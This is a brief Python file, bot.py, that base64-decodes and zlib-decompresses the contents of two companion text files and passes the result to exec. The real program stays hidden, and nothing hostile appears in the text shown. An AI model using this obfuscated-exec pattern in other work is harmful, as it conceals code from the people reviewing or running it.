# language: Python 3.11+, file: bot.py
import zlib, base64
from pathlib import Path
_p1 = Path(__file__).with_name("code_p1.txt").read_text(encoding="utf-8")
_p2 = Path(__file__).with_name("code_p2.txt").read_text(encoding="utf-8")
code = zlib.decompress(base64.b64decode(_p1 + _p2)).decode()
exec(compile(code, "bot.py", "exec"), globals())
